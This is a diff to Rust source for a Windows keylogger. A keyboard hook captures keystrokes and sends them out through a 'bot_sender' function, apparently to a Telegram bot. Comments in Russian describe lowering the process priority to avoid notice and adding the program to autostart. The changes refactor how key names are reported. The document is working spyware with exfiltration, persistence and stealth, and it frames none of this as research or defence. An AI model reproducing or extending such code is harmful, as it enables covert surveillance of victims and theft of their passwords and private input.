@@ -42,29 +42,30 @@ unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param:
             tokio::spawn(tg::bot_sender(String::from("(Caps Lock) ")));
         }
 
-        // shift или не shift и вывод key pressed
-        if is_shift_pressed && is_any_key_pressed() {
-            if keyboard.vkCode == 164 {
-                tokio::spawn(tg::bot_sender(String::from("(Shift) Key pressed: Alt")));
-            } else {
-                let output = format!("(Shift) Key pressed: {}", keyboard.vkCode as u8 as char);
-                tokio::spawn(tg::bot_sender(output));
+        let message = match keyboard.vkCode {
+            9 => "Key pressed: Tab",
+            20 => "Key pressed: Caps Lock",
+            160 => "Key pressed: Shift",
+            162 => "Key pressed: Ctrl",
+            164 => "Key pressed: Alt",
+            32 => "Key pressed: Space",
+            27 => "Key pressed: Esc",
+            8 => "Key pressed: Backspace",
+            13 => "Key pressed: Enter",
+            _ => {
+                if is_shift_pressed && is_any_key_pressed() {
+                    if keyboard.vkCode == 164 {
+                        "(Shift) Key pressed: Alt"
+                    } else {
+                        return 0; // Skip character keys when shift is pressed with other keys
+                    }
+                } else {
+                    return 0; // Skip unhandled keys
+                }
             }
-        } else {
-            let output = format!("Key pressed: {}", keyboard.vkCode as u8 as char);
-            match keyboard.vkCode {
-                9 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Tab"))),
-                20 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Caps Lock"))),
-                160 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Shift"))),
-                162 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Ctrl"))),
-                164 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Alt"))),
-                32 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Space"))),
-                27 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Esc"))),
-                8 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Backspace"))),
-                13 => tokio::spawn(tg::bot_sender(String::from("Key pressed: Enter"))),
-                _ => tokio::spawn(tg::bot_sender(output)),
-            };
-        }
+        };
+
+        tokio::spawn(tg::bot_sender(String::from(message)));
     }
     CallNextHookEx(null_mut(), n_code, w_param, l_param)
 }
@@ -119,8 +120,7 @@ async fn main() {
 
     // Снижаем приоритет процесса, чтобы сделать его менее заметным
     unsafe {
-        let process = GetCurrentProcess();
-        SetPriorityClass(process, BELOW_NORMAL_PRIORITY_CLASS);
+        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
     }
 
     // Добавление в автозапуск
@@ -131,7 +131,7 @@ async fn main() {
     }
 
     // Запускаем `check` в фоне
-    tokio::spawn(async move {
+    tokio::spawn(async {
         loop {
             tg::check(len).await;
         }
